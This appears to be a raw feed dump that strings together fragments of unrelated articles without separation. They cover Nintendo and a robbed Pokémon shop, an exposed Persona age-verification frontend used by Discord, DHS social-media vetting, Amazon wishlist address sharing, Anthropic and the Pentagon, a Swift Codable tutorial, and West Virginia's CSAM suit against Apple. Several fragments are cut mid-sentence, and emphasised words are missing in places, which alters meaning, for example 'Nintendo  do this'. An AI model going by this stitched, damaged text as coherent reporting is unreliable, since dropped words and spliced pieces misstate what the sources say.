Asked by the podcast host whether employees might eventually show Dara AI to the board, Khosrowshahi laughed but noted that AI models still can't process and act on new information the way executives do. \"When the models can learn in real-time, that is the point at which I'm going to think that, yeah, we are all replaceable,\" he said.",

It doesn’t matter if it’s <a href=\"https://www.techdirt.com/2024/11/08/patents-nintendo-suing-palworld-over-confirmed-but-damn-this-suit-is-weird/\">patents</a>, <a href=\"https://www.techdirt.com/2024/03/28/site-that-listed-information-about-3rd-party-pokemon-fan-games-shuts-down-under-threat/\">copyright</a>, or trademark, these people will wield it all if they sniff out even the barest potential infringement they can find. But sometimes the depravity of these people’s unflinching focus on IP can surprise even I.</p><p>In January, a card shop called The Poke Court held an event at the store in Manhattan. Unfortunately, that event <a href=\"https://kotaku.com/pokemon-poke-court-nintendo-trainer-nyc-store-robbed-2000669827\">was interrupted by armed gunmen</a> that stormed the storefront and robbed it. It was all over the news and the store received all kinds of support from the local community and online. Obviously a shitty situation, but good people rallied to support them.</p><p>Then Nintendo came calling.</p><blockquote><p><em>The shop posted on its&nbsp;<a href=\"https://www.instagram.com/thepokecourt/p/DU4J-WtkSNT/\">Instagram account</a>&nbsp;that Nintendo reached out with “concerns” about its name and logo, which included the iconic red-and-white Poké Ball.&nbsp;“The short story is Nintendo reached out to us with concerns about our name and logo,” the message read. “This means we’re evolving!”</em></p><p><em>As such, the owners have released a statement with a new name and logo. The store will now be called The Trainer Court, and now has replaced the Poké Ball logo with a new one with a stylized “C” for “Court.” Beyond that, the store will continue to offer the same cards, community events, and tournaments. The Trainer Court will also be hosting an event on Pokémon Day, February 27, which commemorates the series’ 30th anniversary.</em></p></blockquote><p>Now, I want to be very clear about this: Nintendo  do this. The store’s name and logo are likely infringing. In a vacuum, this would be your run of the mill trademark issue, with a large company forcing a smaller company to rebrand, because that’s simply what they do.</p><p>But this isn’t in a vacuum. Nintendo only caught wind of this supposed “threat” because very real people with very real guns forced a traumatic experience upon the store owners, workers, and customers. There is nothing in the Instagram message posted above to indicate that Nintendo expressed anything at all to the business other than its concerns about intellectual property. It appears that Nintendo cares more about that than any of the lives impacted by what was an armed robbery.</p><p>The business itself is putting on both a brave face and a positive attitude about all of this.</p><blockquote><p><em>“Above all, we have always been fans of&nbsp;Pokémon,” the statement reads. “We are a group of kids who refuse to grow up, and we spend every day celebrating this franchise that means so much to us.”</em></p></blockquote><p>That’s great, but it sure would be lovely if that same humanity and enthusiasm was mirrored by the very business of which they are such fans. And perhaps the ink could have dried on the police reports before Nintendo felt it necessary to pump out some legal threat letters. </p>",

      "content": "<p>We’ve been saying this for years now, and we’re going to keep saying it until the message finally sinks in: mandatory age verification creates massive, centralized honeypots of sensitive biometric data that will <a href=\"https://www.techdirt.com/2024/05/03/hours-after-aussie-govt-greenlights-online-age-verification-pilot-mandated-verification-database-for-bars-is-breached/\">inevitably be breached</a>. Every <a href=\"https://www.techdirt.com/2024/06/28/yet-another-id-verification-service-breached-exposing-private-info-collected-on-behalf-of-uber-tiktok-more/\">single time</a>. And every single time it happens, the politicians who mandated these systems and the companies that built them act shocked——that collecting enormous databases of government IDs, facial scans, and biometric data from millions of people turns out to be a security nightmare.</p><p>A couple weeks ago, <a href=\"https://discord.com/press-releases/discord-launches-teen-by-default-settings-globally\">Discord announced</a> it would launch “teen-by-default” settings for its global audience, meaning all users would be shunted into a restricted experience unless they verified their age through biometric scanning. The internet, predictably, was not thrilled. But while many users were busy venting their frustration, a group of security researchers decided to do something more useful: they took a look under the hood at Persona, one of the companies Discord was using for verification (specifically for users in the UK).</p><blockquote><p><em>Together with two other researchers, they set out to look into Persona, the San Francisco-based startup that’s used by Discord for biometric identity verification – and found a Persona frontend exposed to the open internet on a US government authorized server.</em></p><p><em>In 2,456 publicly accessible files, the code</em><a href=\"https://vmfunc.re/blog/persona\"></a><em>the extensive surveillance Persona software performs on its users, bundled in an interface that pairs facial recognition with financial reporting – and a parallel implementation that appears designed to serve federal agencies.</em></p></blockquote><p>Let me say that again: <em>2,456 publicly accessible files</em> sitting on a government-authorized server, exposed to the open internet. Files that revealed a system performing not a simple age check, but a ton of potentially intrusive checks:</p><blockquote><p><em>Once a user verifies their identity with Persona,</em><strong><em>the software performs 269 distinct verification checks and scours the internet and government sources for potential matches</em></strong><em>, such as by matching your face to politically exposed persons (PEPs), and generating risk and similarity scores for each individual. IP addresses, browser fingerprints, device fingerprints, government ID numbers, phone numbers, names, faces, and even selfie backgrounds are analyzed and retained for up to three years.</em></p><p><em>The information the software evaluates on the images themselves includes “Selfie Suspicious Entity Detection,” a “Selfie Age Inconsistency Comparison,” similar background detection, which appears to be matched to other users in the database, and a “Selfie Pose Repeated Detection,” which seems to be used to determine whether you are using the same pose as in previous pictures.</em></p></blockquote><p>This was the same company checking whether a teenager should be allowed to use voice chat on a gaming platform.</p><blockquote><p><em>Beyond offering simple services to estimate your age, Persona’s exposed code compares your selfie to watchlist photos using facial recognition, screens you against 14 categories of adverse media from mentions of terrorism to espionage, and tags reports with codenames from active intelligence programs consisting of public-private partnerships to combat online child exploitative material, cannabis trafficking, fentanyl trafficking, romance fraud, money laundering, and illegal wildlife trade.</em></p></blockquote><p>So you wanted to verify you’re old enough to use voice chat, and now there’s a permanent risk score somewhere documenting whether you might be involved in illegal wildlife trafficking.</p><p>As the researchers put it to The Rage:</p><blockquote><p><em>“The internet was supposed to be the great equalizer. Information wants to be free, the network interprets censorship as damage and routes around it, all that beautiful optimism. And for a minute it was true.”</em></p><p><em>“The state wants to see everything. The corporations want to see everything. And they’ve learned to work together.”</em></p></blockquote><p>Discord, to its credit, has now said it <a href=\"https://www.mediapost.com/publications/article/413004/discord-ditches-age-verification-partner-following.html\">will not be proceeding with Persona</a> for identity verification. And to be fair, Discord and similar internet companies are in an impossible position here—facing mounting regulatory pressure in multiple jurisdictions to verify ages while being handed a market of vendors who keep turning out to be security nightmares. But this is part of a pattern that should be deeply familiar by now.</p><p>Just last year, Discord’s  third-party age verification partner suffered a breach that <a href=\"https://www.techdirt.com/2025/10/07/another-day-another-age-verification-data-breach-discords-third-party-partner-leaked-government-ids/\">exposed 70,000 government ID photos</a>, which were then held for ransom. Discord said it stopped using that vendor. Then it moved to Persona, which was already raising concerns due to <a href=\"https://kotaku.com/discord-palantir-peter-thiel-persona-age-verification-2000668951\">connections to Peter Thiel</a>. Now Persona’s frontend is found wide open on a government-authorized server, and Discord is dropping them too.</p><p>See the pattern? Discord keeps swapping vendors like someone frantically rotating buckets under a leaking roof, apparently hoping the next bucket won’t have a hole in it. But the problem was never the bucket. The problem is the hole in the roof — the never-ending stream of age-verification government mandates.</p><p>And this brings us to the bigger, more important point that almost nobody in the “protect the children” policy crowd seems willing to engage with honestly. Every single time you mandate age verification, you are mandating the creation of a centralized database of extraordinarily sensitive personal information. Government IDs. Biometric facial data. The kind of data that, once breached, cannot be “changed” like a password. You get one face. You get one government ID number. When those leak—and they  leak—the damage is permanent.</p><blockquote><p><em>These systems fail in predictable ways.</em></p><p><em>False positives are common. Platforms identify as minors adults with youthful faces, or adults who are sharing family devices, or have otherwise unusual usage. They lock accounts, sometimes for days. False negatives also persist. Teenagers learn quickly how to evade checks by borrowing IDs, cycling accounts, or using VPNs.</em></p><p><em>The appeal process itself creates new privacy risks. Platforms must store biometric data, ID images, and verification logs long enough to defend their decisions to regulators. So if an adult who is tired of submitting selfies to verify their age finally uploads an ID, the system must now secure that stored ID. Each retained record becomes a potential breach target.</em></p><p><em>Scale that experience across millions of users, and you bake the privacy risk into how platforms work.</em></p></blockquote><p>This keeps happening because it  keep happening. It’s the inevitable result of a system designed to aggregate the exact kind of data that attackers most want to steal. Computer scientists and privacy experts have been sounding this alarm for years.</p><p>And what makes this even more galling is that these age verification systems don’t even accomplish what they claim to accomplish.</p><p>Take Australia’s infamous ban on social media for under-16s, the poster child for this approach. It’s been a complete failure on its own terms: plenty of kids have already figured out <a href=\"https://www.euronews.com/next/2026/01/29/australias-under-16-social-media-ban-how-children-are-already-finding-ways-around-it\">ways around the ban</a>, while those who can’t—particularly <a href=\"https://www.techdirt.com/2026/02/17/australias-social-media-ban-is-isolating-kids-with-disabilities-just-like-critics-warned/\">kids with disabilities who relied on social platforms for community</a>—are being actively harmed by their exclusion. As the security researcher who helped discover the Persona leak, Celeste, told The Rage:</p><blockquote><p><em>“Normies won’t be able to bypass these,” while less benevolent people “will always find ways to exploit your system.”</em></p></blockquote><p>So we’ve built a system that fails to keep out the people it’s supposedly targeting, while successfully creating permanent biometric dossiers on millions of law-abiding users. Not great!</p><p>Meanwhile, what’s happening at the legislative level is perhaps even more cynical. Governments around the world are pushing harder and harder for mandatory age verification online. And as these mandates create a captive market worth billions of dollars, a whole ecosystem of venture-backed “identity-as-a-service” startups has sprung up to serve it. Persona, valued at $2 billion and backed by Peter Thiel’s investment network, is just one of many. These companies make grand promises about privacy-preserving verification, get contracts with major platforms, and then — whoops — leave 2,456 files exposed on a government server.</p><p>And, of course, these very firms are now <em>lobbying for stricter age verification mandates</em>. They’ve positioned themselves as protectors of children while actively working to expand the legal requirements that guarantee their revenue stream.</p><p>Lawmakers mandate an impossible task, VC-backed startups pop up to sell a “solution,” those startups then lobby for even stricter mandates to protect their market, and the cycle repeats.</p><p>“Child safety” has simply become the marketing department for a rent-seeking surveillance industry.</p><p>As long as the law demands that these biometric gates exist, the “security” of the data they collect will always be a secondary concern to “compliance” with the mandate. Companies will keep rotating through vendors, each one promising that  system is the one that won’t leak, right up until it does. And the age verification industry will keep lobbying for stricter laws, because every new mandate is another guaranteed revenue stream.</p><p>The researchers who exposed Persona’s frontend hope their findings will serve as a wake-up call. Given the track record, it probably won’t be. Discord dropping Persona changes nothing—the next vendor will collect the same data, make the same promises, and eventually suffer the same breach. Because the problem was never which company holds your biometric data. The problem is that anyone is being forced to hand it over in the first place.</p>",

The new requirement, which was approved for one year, comes after the administration has openly declared its intent to use social media handles to screen people for speech it dislikes.</em></p></blockquote><p>That’s from the Brennan Center report published earlier this month. What was once limited to people seeking visas, asylum, or work permits is now being foisted on people who have been here legally for years, including US citizens.</p><p> could have seen this coming. The DHS has gradually expanded its biometric program from targeting foreign arrivals at US airports to <a href=\"https://www.techdirt.com/2023/03/21/tsa-confirms-biometric-scanning-soon-wont-be-optional-even-for-domestic-travelers/\" data-type=\"link\" data-id=\"https://www.techdirt.com/2023/03/21/tsa-confirms-biometric-scanning-soon-wont-be-optional-even-for-domestic-travelers/\">pretty much </a> who utilizes an international airport, even while traveling entirely domestically. The end goal is biometric scanners <a href=\"https://www.techdirt.com/2023/03/21/tsa-confirms-biometric-scanning-soon-wont-be-optional-even-for-domestic-travelers/\" data-type=\"link\" data-id=\"https://www.techdirt.com/2023/03/21/tsa-confirms-biometric-scanning-soon-wont-be-optional-even-for-domestic-travelers/\">in  US airport</a> for no real reason other than the DHS <a href=\"https://www.techdirt.com/2023/03/21/tsa-confirms-biometric-scanning-soon-wont-be-optional-even-for-domestic-travelers/\" data-type=\"link\" data-id=\"https://www.techdirt.com/2023/03/21/tsa-confirms-biometric-scanning-soon-wont-be-optional-even-for-domestic-travelers/\">wants to do this</a>. </p><p>This sure as shit doesn’t  like America:</p><blockquote><p><em>The more than 3 million people applying each year for immigration status changes — such as seeking work or travel authorization, a green card, or citizenship — will now be required to give the government their social media handles. In some cases, they must also provide the handles of their young children, spouses, and parents, many of whom are U.S. citizens, green card holders, or are otherwise in the United States legally. The new rules will require them to submit any social media handles they have used over the past five years, whether used in a personal or professional capacity or even on behalf of an organization. This covers platforms including Facebook, X, Instagram, TikTok, and YouTube as well as messaging services such as WhatsApp, Telegram, and GroupMe.</em></p></blockquote><p>The underlying message is clear: if you want to live in America, you have to play by the rules the administration sets down. To be part of Trump’s version of the United States, you are expected to constantly run towards goalposts that keep moving deeper into the surveillance state. It’s all very reminiscent of every authoritarian regime that knew the only way to stay in power was to keep increasing the size of the jackboot. </p><p>This would be terrible enough in isolation. But this <a href=\"https://www.nytimes.com/2026/02/13/technology/dhs-anti-ice-social-media.html\" data-type=\"link\" data-id=\"https://www.nytimes.com/2026/02/13/technology/dhs-anti-ice-social-media.html\">comes on top</a> of the DHS <a href=\"https://www.techdirt.com/2026/02/05/dhs-is-hunting-down-trump-critics-the-free-speech-warriors-are-mighty-quiet/\" data-type=\"link\" data-id=\"https://www.techdirt.com/2026/02/05/dhs-is-hunting-down-trump-critics-the-free-speech-warriors-are-mighty-quiet/\">sending subpoenas to tech companies</a> in hopes of unmasking social media account owners who have done nothing more than engage in protected speech. And  on top of multiple moves made by the DHS and other federal agencies <a href=\"https://www.techdirt.com/2025/12/09/how-ices-plan-to-monitor-social-media-threatens-not-just-privacy-but-civic-participation/\" data-type=\"link\" data-id=\"https://www.techdirt.com/2025/12/09/how-ices-plan-to-monitor-social-media-threatens-not-just-privacy-but-civic-participation/\">to nudge people</a> towards engaging in self-censorship or “self-deportation.” </p><p>And, just in case you might think the government is too clumsy and inefficient to turn this into the oppression <a href=\"https://www.techdirt.com/2026/01/20/state-department-detaining-people-for-social-media-activity-is-paranoid-and-sign-of-an-illegitimate-regime-unless-we-do-it/\" data-type=\"link\" data-id=\"https://www.techdirt.com/2026/01/20/state-department-detaining-people-for-social-media-activity-is-paranoid-and-sign-of-an-illegitimate-regime-unless-we-do-it/\">it clearly desires it to be</a>, may I remind you that ICE, CBP, and the DHS itself have access (or are seeking to acquire) multiple forms of always-on social media surveillance tools to keep tabs on what this administration considers to be “anti-American” sentiment. That it’s actually “anti-this-fucking-administration” sentiment makes no difference to the Administrator in Chief, who not only thinks he’s a king, but expects everyone from cabinet members to taxpayers to treat him as one. </p><p>If there’s any silver lining here, it’s that this sort of thing doesn’t really work. As the Brennan Center report points out, the administration should already know this. Trump was briefed back in 2016 that social media “vetting” rarely returned anything of value in terms of national security. These findings were reiterated in a report delivered by government officials in 2021, who stated social media disclosure “added no value” to existing vetting efforts. </p><p>But things have changed. Trump, in particular, doesn’t actually care whether or not it adds any national security value. <a href=\"https://www.techdirt.com/2025/08/28/trump-admin-goes-full-mccarthy-will-decide-whether-migrants-are-pro-usa-enough-to-stay-here/\" data-type=\"link\" data-id=\"https://www.techdirt.com/2025/08/28/trump-admin-goes-full-mccarthy-will-decide-whether-migrants-are-pro-usa-enough-to-stay-here/\">He only cares</a> that it might help him hunt down his critics and/or encourage them to speak up less loudly and/or frequently. </p><blockquote><p><em>In reviving the proposal this year, USCIS said that gathering social media handles is necessary to comply with the administration’s new&nbsp;<a href=\"https://www.federalregister.gov/documents/2025/01/30/2025-02009/protecting-the-united-states-from-foreign-terrorists-and-other-national-security-and-public-safety\">policy</a>&nbsp;of screening people in the United States for “hostile attitudes” or “hateful ideology” toward Americans or U.S. culture and institutions.&nbsp;</em></p></blockquote><p>Oh, if only irony meant anything. The people with the most “hostile attitude” towards Americans and American culture and institutions are the MAGA fiends running the nation. This is nothing more than a particularly right-wing take on “better red than dead.” With any luck, this version of the GOP will get kicked to the curb forever, replaced by better people who will never abuse the expansive powers the departing despots leave behind.</p>",

The change is especially concerning to many sex workers, influencers and public figures who use Amazon wishlists to receive gifts from fans and clients.&nbsp;</p><p>First spotted by adult content creators raising the alarm on social media, the changes open anyone who uses wishlists publicly to increased privacy risk unless they change how they receive packages.</p><p>In an email sent to list holders, Amazon said beginning March 25, it will reveal users’ shipping addresses to third-party sellers. The platform added that gift purchasers might end up seeing your address as part of this process, too.&nbsp;</p><p>Before this change, the only information visible to sellers and gift purchases was the recipients’ city and state.</p><p>“We're writing to inform you about an upcoming change to Amazon Lists. Starting March 25, 2026, we will remove the option to restrict purchases from third-party sellers for list items. When this change takes effect, gift purchasers will be able to purchase items sold by third-party sellers from your lists and your delivery address will be shared with the seller for fulfillment. This change will provide gift purchasers with access to a wider selection of items when shopping from your lists,” Amazon said in the email. “Important note: When gifts are purchased from your shared or public lists, Amazon needs to provide your shipping address to sellers and delivery partners to fulfill these orders. During the delivery process, your address may become visible to gift purchasers through delivery updates and tracking information. To help protect your privacy, we recommend using a PO Box or non-residential address for any list you share with public audiences.”</p><p>If you have public wishlists, you can manage individual list settings <a href=\"https://www.amazon.com/wishlist?ref=404media.co\" rel=\"noreferrer\">here</a> and select \"manage list.\" From there you can change your list privacy settings to private or shared to limit who has access, or remove your shipping address entirely by selecting \"none\" from the dropdown menu.</p><p>Most of the popular shipping methods in the US, including UPS, Fedex, and the USPS, don’t show full addresses as part of package tracking. But if a third-party seller shares a gift recipient’s home address with a buyer as part of the tracking process, Amazon is saying that’s out of the platform’s control. And some of those delivery services send photos as part of the tracking process for proof of delivery, which could include more information about one’s home or location than they would want a gift sender to see.&nbsp;</p><p>“Those who do a range of work where privacy concerns are top of mind would be left to wonder what problem Amazon is solving with this change,” <a href=\"https://allmylinks.com/krystaldavisxxx?ref=404media.co\"></a>, an adult content creator who <a href=\"https://x.com/KrystalDavisXXX/status/2026681658464940452?ref=404media.co\"></a> receiving the email from Amazon, told 404 Media. “Those who use these lists as an opportunity to allow fans to show support and offset expenses will lose that option. The alternatives to Amazon wishlist are significantly lacking.”</p><p>Many online sex workers use Amazon wishlists to receive gifts from subscribers and fans. It’s a practice that’s <a href=\"https://www.cnet.com/tech/services-and-software/amazon-serves-dominatrix-as-the-king-of-kinky-wish-lists/?ref=404media.co\"></a>. Revealing one’s full address to buyers — especially if they don’t realize this change has gone into effect, or missed the email sent by Amazon with the warning to switch to a P.O. box — puts their safety at serious risk. And like so many privacy and security issues that affect sex workers first, anyone could potentially be affected; lots of people use public wishlists who might want to keep their location private, and should consider checking their settings or switching to a non-residential address if they want to maintain that privacy.</p><p>Amazon provides conflicting information on when and how this change will go into effect. The email sent to wishlist holders says it will start on March 25, 2026, but as of writing, a notice on the “Manage List” settings page said starting February 25, third party sellers will see users’ shipping addresses.&nbsp;Amazon confirmed to 404 Media that the option to restrict purchases from third-party sellers for list items is being removed on March 25, one month from today.</p>",

Anthropic should stick by their principles and refuse to allow their technology to be used in the two ways they have publicly stated they would not support:&nbsp;<a href=\"https://www.wired.com/story/backchannel-anthropic-dispute-with-the-pentagon/\">autonomous weapons systems and surveillance</a>. The Department of Defense has reportedly threatened to label Anthropic a “supply chain risk,” in retribution for not lifting restrictions on how their technology is used. According to&nbsp;<a href=\"https://www.wired.com/story/backchannel-anthropic-dispute-with-the-pentagon/\">WIRED</a>, that label would be, “a scarlet letter usually reserved for companies that do business with countries scrutinized by federal agencies, like China, which means the Pentagon would not do business with firms using Anthropic’s AI in their defense work.”</p><p>In 2025,&nbsp;<a href=\"https://www.wired.com/story/backchannel-anthropic-dispute-with-the-pentagon/\">reportedly</a>&nbsp;Anthropic became the first AI company cleared for use in relation to classified operations and to handle classified information.

      "content": "<p>I recently came across an interesting challenge involving JSON decoding in Swift. Like many developers, when faced with a large, complex JSON response, my first instinct was to reach for “quick fix” tools. I wanted to see how our popular online resources — like&nbsp;, various JSON-to-Swift converters, and even modern AI models — would handle a messy, repetitive data structure.</p><p>\\\nTo be honest, I was completely underwhelmed.</p><h2>The Problem: The “Flat” JSON Nightmare</h2><p>The issue arises when you encounter a legacy API or a poorly structured response that uses “flat” numbered properties instead of clean arrays. Take a look at this JSON sample:</p><pre><code>{ \n  \"meals\": [ \n      { \n    \"idMeal\": \"52771\",\n    \"strMeal\": \"Spicy Arrabiata Penne\",\n     \"strInstructions\": \"Bring a large pot of water to a boil...\",\n     \"strMealThumb\": \"https://www.themealdb.com/images/media/meals/ustsqw1468250014.jpg\",\n     \"strIngredient1\": \"penne rigate\", \n      \"strIngredient2\": \"olive oil\", \n      \"strIngredient3\": \"garlic\", \n      \"strIngredient4\": \"chopped tomatoes\",\n       \"strIngredient5\": \"red chilli flakes\", \n    // ... this continues up to strIngredient20 \n      \"strMeasure1\": \"1 pound\", \n      \"strMeasure2\": \"1/4 cup\", \n      \"strMeasure3\": \"3 cloves\", \n      // ... this continues up to strMeasure20 \n      } \n    ]\n}\n</code></pre><h2>Why Online Converters Fail</h2><p>When I plugged this into standard conversion tools, the result was a maintenance nightmare. They generated a “wall of properties” that looked something like this:</p><pre><code>struct Meal: Codable {\n  let idMeal: String \n  let strMeal: String \n  let strInstructions: String?\n  let strMealThumb: String? \n  // The repetitive property nightmare \n  let strIngredient1: String? \n  let strIngredient2: String? \n  let strIngredient3: String? \n  // ... \n  let strIngredient20: String? \n  let strMeasure1: String? \n  let strMeasure2: String? \n  let strMeasure3: String? \n  // ... \n  let strMeasure20: String?\n}\n</code></pre><p>\\\nLet’s be honest, the code generated by those online tools belongs in the “trash bin” for any serious project. Not only is it unscalable, but imagine the look on your senior developer’s face during a PR review when they see 40+ optional properties. It’s a maintenance nightmare and a blow to your professional reputation.</p><p>\\\nI decided to take control of the decoding process to make it clean, Swifty, and — most importantly —&nbsp;. Here is how I structured the solution and why it works.</p><h2>The Secret Weapon: Why We Use a Struct for CodingKeys</h2><p>In 99% of Swift tutorials, you see&nbsp;&nbsp;defined as an&nbsp;. Enums are great when you know every single key at compile time. But in our case, we have a \"flat\" JSON with keys like&nbsp;,&nbsp;… up to&nbsp;. Writing an enum with 40 cases is not just boring — it’s bad engineering. That is why we use a&nbsp;&nbsp;instead.</p><h2>1. Breaking the Protocol Requirements</h2><p>To conform to&nbsp;, a type must handle both&nbsp;&nbsp;and&nbsp;&nbsp;values. By using a struct, we can pass&nbsp;&nbsp;string into the initializer at runtime.</p><pre><code>struct CodingKeys: CodingKey {\n\n   let stringValue: String \n   var intValue: Int? \n\n   init?(stringValue: String) {\n       self.stringValue = stringValue \n   }  \n   // This allows us to map any raw string from the JSON to our logic \n   init(rawValue: String) { \n      self.stringValue = rawValue\n   } \n\n   init?(intValue: Int) {\n     return nil \n   }\n   // We don't need integer keys here\n}\n</code></pre><h2>2. Mapping “Ugly” Keys to Clean Names</h2><p>You don’t have to stick with the API’s naming conventions inside your app. Notice how I used&nbsp;&nbsp;to create aliases. This keeps the rest of the decoding logic readable while keeping the \"dirty\" API keys isolated inside this struct.</p><pre><code>static var name = CodingKeys(rawValue: \"strMeal\")\nstatic var thumb = CodingKeys(rawValue: \"strMealThumb\")\nstatic var instructions = CodingKeys(rawValue: \"strInstructions\")\n</code></pre><h2>3. The Power of Dynamic Key Generation</h2><p>This is the part that makes this approach superior to any AI-generated code. We created static functions that use&nbsp;&nbsp;to generate keys on the fly.</p><pre><code>static func strIngredient(_ index: Int) -&gt; Self {\n   CodingKeys(rawValue: \"strIngredient\\(index)\")\n}\n\nstatic func strMeasure(_ index: Int) -&gt; Self {\n   CodingKeys(rawValue: \"strMeasure\\(index)\")\n}\n</code></pre><p>\\\nInstead of hardcoding&nbsp;,&nbsp;, etc., we now have a \"key factory.\" When we loop through&nbsp;&nbsp;in our initializer, we simply call these functions. It’s clean, it’s reusable, and it’s significantly harder to make a typo than writing 40 individual cases.</p><h2>4. Building a Model That Actually Makes Sense</h2><p>The original JSON treats an ingredient and its measurement as two strangers living in different houses. In our app, there are a couple. By nesting a dedicated struct, we fix the data architecture at the source:</p><pre><code>struct Ingredient: Decodable, Hashable {\n   let id: Int \n   let name: String\n   let measure: String\n}\n</code></pre><p>I added an&nbsp;&nbsp;property using the loop index. Why? Because modern SwiftUI views like&nbsp;&nbsp;and&nbsp;&nbsp;require identifiable data. By conforming to&nbsp;, we ensure:</p><ul><li>&nbsp;SwiftUI won’t get confused if two different ingredients have the same name (like two different types of “Salt”).</li><li>&nbsp;Diffable data sources love hashable objects.</li></ul><h2>5. Cleaning Up the “API Smell”</h2><p>Before we get to the initializer, look at how we define our main properties. We aren’t just copying what the API gives us; we are translating it into&nbsp;.</p><pre><code>let name: String\nlet thumb: URL?\nlet instructions: String\nlet ingredients: [Ingredient]\n</code></pre><ul><li>&nbsp;We dropped the Hungarian notation.&nbsp;&nbsp;is better than&nbsp;.</li><li>&nbsp;We decode the thumbnail directly into a&nbsp;. If the API sends a broken link or an empty string, our decoder handles it gracefully during the parsing phase, not later in the View.</li></ul><h2>6. The Smart Initializer: Our “Data Bouncer”</h2><p>This is the finale. Instead of blindly accepting every key the JSON offers, our custom&nbsp;&nbsp;acts like a bouncer at a club—only valid data gets in.</p><pre><code>init(from decoder: any Decoder) throws {\n let container = try decoder.container(keyedBy: CodingKeys.self)\n  // 1. Decode simple properties using our clean aliases \n  self.name = try container.decode(String.self, forKey: .name) \n  self.thumb = try? container.decode(URL.self, forKey: .thumb) \n  self.instructions = try container.decode(String.self, forKey: .instructions) \n\n// 2. The Dynamic Decoding Loop \n  var ingredients: [Ingredient] = []  \n  for index in 1...20 { \n\n  // We use 'try?' because some keys might be null or missing \n  if let name = try? container.decode(String.self, forKey: .strIngredient(index)),\n     let measure = try? container.decode(String.self, forKey: .strMeasure(index)), \n    !name.isEmpty, !measure.isEmpty { \n    // We only save it if the name AND measure are valid and non-empty \n    ingredients.append(Ingredient(id: index, name: name, measure: measure)) \n\n    } \n  } \n  self.ingredients = ingredients\n}\n</code></pre><h2>The Final Result: Clean, Swifty, and UI-Ready</h2><p>After all that work behind the scenes, look at what we’ve achieved. We have transformed a “flat” JSON nightmare into a model that is a joy to use. This is what the rest of your app sees now:</p><pre><code>struct MealDetail { \n  let name: String \n  let instructions: String\n  let thumb: URL? \n  let ingredients: [Ingredient] \n}\n</code></pre><h2>Pure Simplicity in the UI</h2><p>Because we did the heavy lifting during the decoding phase — filtering empty values and grouping ingredients — our SwiftUI code becomes incredibly clean. We don’t need any complex logic in the View; we just map the data directly to the components.</p><h2>The Cherry on Top: Making Mocking Easy</h2><p>You might have noticed one small side effect: when we define a custom&nbsp;, Swift stops generating the default memberwise initializer. This can make writing unit tests or SwiftUI Previews a bit annoying.</p><p>\\\nTo fix this and keep our codebase “test-friendly,” we can add this simple extension. This allows us to create “Mock” data for our UI without needing a JSON file.</p><pre><code>extension MealDetail { \n  // Restoring the ability to create manual instances for Mocks and Tests \n  init(name: String, thumb: URL?, instructions: String, ingredients: [Ingredient]) {\n     self.name = name \n     self.thumb = thumb \n     self.instructions = instructions\n     self.ingredients = ingredients \n  }\n}\n</code></pre><p>\\\nNow, creating a preview is as simple as:&nbsp;<code>let mock = MealDetail(name: \"Pasta\", thumb: nil, instructions: \"Cook it.\", ingredients: [])</code></p><p>The next time you’re faced with a messy API, remember:&nbsp;<strong>don’t let the backend dictate your frontend architecture.</strong>&nbsp;Online tools and AI might give you a quick “copy-paste” solution, but they often lead to technical debt. By taking control of your&nbsp;&nbsp;implementation, you create code that is:</p><ol><li>&nbsp;Clear, intent-based property names.</li><li>&nbsp;Filters out empty or corrupt data at the source.</li><li>&nbsp;Easy to test and easy to display in the UI.</li></ol><p>\\\nHappy coding, and keep your models clean!</p>",

      "content": "<p>West Virginia Attorney General JB McCuskey wants you to think he’s protecting children. <a href=\"https://ago.wv.gov/article/west-virginia-attorney-general-sues-apple-role-distribution-child-sexual-abuse-material\">His press release says so</a>. His <a href=\"https://ago.wv.gov/sites/default/files/2026-02/Filing.pdf\">legal complaint</a> opens with the genuinely horrific line that Apple has, in internal communications, described itself as the “greatest platform for distributing child porn.” He makes sure you know that Google made 1.47 million CSAM reports to the National Center for Missing and Exploited Children (NCMEC) in 2023 while Apple made just 267. He is, as politicians love to say, fighting for the kids.</p><p>What he is actually doing, if he succeeds, is building an extraordinarily effective  for child predators.</p><p>This feels difficult for some people—including, apparently, the Attorney Freaking General of West Virginia—to mentally wrap their heads around, but it’s important: the legal approach he’s taking <strong>will help child predators massively</strong> if he succeeds. The fact that West Virginia’s AG office—staffed with actual lawyers, supplemented by outside private counsel—apparently didn’t bother to read the existing Fourth Amendment jurisprudence before filing this case is, frankly, staggering.</p><p>The complaint is a “first-of-its-kind government lawsuit,” as McCuskey’s office proudly announced, targeting Apple’s “failure to detect and report CSAM on iCloud.” It alleges strict liability for design defect, negligence, public nuisance, and violations of the West Virginia Consumer Credit and Protection Act. It demands injunctive relief requiring Apple to “implement effective CSAM detection measures.” It specifically points to the PhotoDNA detection system used by Google and Meta, and to Apple’s own abandoned NeuralHash client-side scanning project, as evidence of feasible alternatives that Apple is choosing not to use.</p><p>Here is the part McCuskey’s complaint does not engage with: the moment a court orders Apple to conduct those scans, any CSAM those scans find becomes evidence obtained through a warrantless government search—and under well-established Fourth Amendment doctrine, that evidence gets excluded. Defense attorneys will move to suppress it. They will win. And without the CSAM itself as evidence, convictions become nearly impossible.</p><p>The constitutional mechanics here are well-established, and <a href=\"https://www.techdirt.com/2024/08/19/suing-apple-to-force-it-to-scan-icloud-for-csam-is-a-catastrophically-bad-idea/\">were laid out in excruciating detail</a> a year and a half ago right here on Techdirt by Stanford’s Riana Pfefferkorn when a very similar private class action lawsuit against Apple was filed in Northern California federal court. Her analysis deserves to be quoted at length, because it goes to the heart of why McCuskey’s lawsuit is not just misguided but actively counterproductive:</p><blockquote><p><em>While the Fourth Amendment applies only to the government and not to private actors, the government can’t use a private actor to carry out a search it couldn’t constitutionally do itself.</em><strong><em>If the government compels or pressures a private actor to search, or the private actor searches primarily to serve the government’s interests rather than its own, then the private actor counts as a government agent for purposes of the search, which must then abide by the Fourth Amendment</em></strong><em>, otherwise the remedy is exclusion.</em></p><p><em>If the government – legislative, executive, or judiciary – forces a cloud storage provider to scan users’ files for CSAM, that makes the provider a government agent, meaning the scans require a warrant, which a cloud services company has no power to get, making those scans unconstitutional searches. Any CSAM they find (plus any other downstream evidence stemming from the initial unlawful scan) will probably get excluded, but it’s hard to convict people for CSAM without using the CSAM as evidence, making acquittals likelier. Which defeats the purpose of compelling the scans in the first place.</em></p></blockquote><p>Read that again. If West Virginia wins—if an actual court orders Apple to start scanning iCloud for CSAM—then every image flagged by those mandated scans becomes <em>evidence obtained through a warrantless government search conducted without probable cause</em>. The Fourth Amendment’s exclusionary rule means defense attorneys get to walk into court and demand that evidence be thrown out. And they’ll win that motion. It’s not even a 